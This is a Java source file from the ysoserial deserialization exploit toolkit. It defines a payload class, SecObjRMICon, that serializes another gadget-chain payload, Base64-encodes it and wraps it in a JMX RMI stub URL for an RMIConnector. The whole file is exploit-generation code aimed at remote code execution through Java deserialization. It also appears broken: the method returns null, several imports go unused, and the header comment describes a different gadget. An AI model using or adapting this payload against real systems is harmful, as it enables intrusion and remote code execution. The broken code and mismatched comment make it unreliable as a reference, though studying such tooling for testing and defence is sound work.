package ysoserial.payloads;

import com.sun.syndication.feed.impl.ObjectBean;
import org.apache.commons.codec.binary.Base64;
import ysoserial.Serializer;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.ParseArg;
import ysoserial.payloads.util.PayloadRunner;

import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnector;
import java.io.Serializable;
import java.lang.reflect.Method;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.SignedObject;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

/*
 * Variation on CommonsCollections1 that uses InstantiateTransformer instead of
 * InvokerTransformer.
 */
@SuppressWarnings({"rawtypes", "unchecked", "restriction"})
@Authors({ Authors.J1an })
public class SecObjRMICon extends PayloadRunner implements ObjectPayload<Object> {

	public Object getObject(final String command) throws Exception {
        Class payloadClazz= ParseArg.getTargetPayload(command);
        if (payloadClazz == null) {
            throw new IllegalArgumentException("Invalid payload type '" + command.split(":")[0] + "'");
        }
        Method getPayloadObj= payloadClazz.getMethod("getObject", String.class);
        byte[] base64Obj=Base64.encodeBase64(Serializer.serialize(getPayloadObj.invoke(payloadClazz.newInstance(), command.split(":",2)[1])));
        String finalStubBase64URL="service:jmx:rmi:///stub/" + new String(base64Obj);
        JMXServiceURL jmxServiceURL = new JMXServiceURL(finalStubBase64URL);
        RMIConnector rmiConnector = new RMIConnector(jmxServiceURL,new HashMap());

        return null;
    }

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(SecObjRMICon.class, args);
	}
}
